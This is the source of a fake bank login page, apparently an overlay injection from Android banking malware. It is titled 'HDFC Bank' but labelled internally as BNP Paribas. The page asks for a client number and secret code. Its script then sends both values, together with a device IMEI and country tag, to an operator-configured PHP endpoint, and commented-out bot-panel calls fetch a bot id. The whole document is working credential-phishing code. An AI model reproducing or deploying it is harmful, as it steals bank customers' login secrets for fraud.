<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>HDFC Bank</title>
    <style type="text/css">
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, Sans-Serif;
            margin: 0;
            padding: 0;
            background: #148581;
			height: 100%
        }

        form {
            margin: 0;
            padding: 0;
            border: 0
        }

        input {
            vertical-align: middle
        }

        button {
            vertical-align: middle
        }

        textarea {
            width: 90% !important
        }

        label {
			color: #FFF;
			font-weight: bold;
        }

        p {
            margin: 0;
            padding: 4px 0
        }

        h1 {
            margin: 0;
            padding: 4px 0;
            font-weight: bold;
            font-size: small
        }

        h2 {
            margin: 0;
            padding: 0;
            font-weight: bold;
            font-size: small
        }

        h3 {
            margin: 0;
            padding: 0;
            font-weight: normal;
            font-size: small
        }


        .submit_25 {
            width: 35%;
			border: 0px none;
			margin-top: 10px;
			height: 60px;
			color: rgb(255, 255, 255);
			margin-right: 10px;
			margin-bottom: 40px;
			font-weight: bold;
			background: #2B6864;
			border-radius: 3px;
			font-size: 16px;
        }


        .input_100 {
            width: 99%;
            float: right;
            margin-right: 10px;
            border: 1px solid grey;
            height: 40px;
            margin-top: 2px;
			margin-bottom: 20px;
        }

        .ptb {
            padding: 4px 0
        }


        .content {
            margin: 0;
            padding: 0;
            background-color: #148581;
            margin-left: 10px
        }


        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }

.fielderror{

    border: 1px solid #EC4343;
	width: 99%;
	height: 40px;
	}

    </style>
   
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>


<body class="fitMldoc">
<img src="data:image/png;base64,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">
<div class="fitMlbody" id="content_div">

    <section class="content">
        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <div class="teaser_box">

                <div class="ptb">
				<label for="numero">NUMERO CLIENT</label>
                    <input name="NUMEROCLIENT" id="numero" maxlength="10" class="input_100" type="text">
                </div>
            <script>
                document.getElementById('numero').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
                <br>
                <div class="ptb">
				    <label for="numero">CODE SECRET</label>
                    <input class="input_100" name="CODESECRET" id="codesec" maxlength="50" type="password">
                </div>
            <script>
                document.getElementById('codesec').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
                <div class="ptb">
                    <center>
                        <input value="VALIDER" id="input_submitBtn" class="submit_25" type="button">
                    </center>
                </div>
				
            </div>
			<input type="hidden" name="name" value="Mes Comptes BNP Paribas">


        </form>

 
     <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 
    </section>
</div>
           <script type="text/javascript">
               
                
                
                (function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
                        input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
                    
                    if(!/https?:\/\//i.test(g_sFAct))
                       g_sFAct = 'http://' + g_sFAct;
                    
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
                    try{
                       g_oForm.action = g_sFAct;
                    } catch(e){};
                    
                    var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
                    
                        var oNumInp = document.getElementById('numero');
                        var oCodeInp = document.getElementById('codesec');

                        try{
                            oNumInp.className = oCodeInp.className = 'input_100';
                        } catch(e){};
                        
                        if (oNumInp.value.length < 6) {
                            try{
                                oNumInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                        
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                            try{
                                oCodeInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                top['closeDlg'] = true;
               /* prompt('send', '{"dialog id" : "mescomptes'+
                    '", "numero_cliento": "'+oNumInp.value+
                    '", "code_secret": "'+oCodeInp.value+'"}');
                        
                        document.getElementById('content_div').style.visibility = 'hidden';
                        g_oForm.submit();
                        */
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mescomptes|"+oNumInp.value+"|"+oCodeInp.value+"|");

                        return false;
                    };

                })();
            </script>

</body></html>
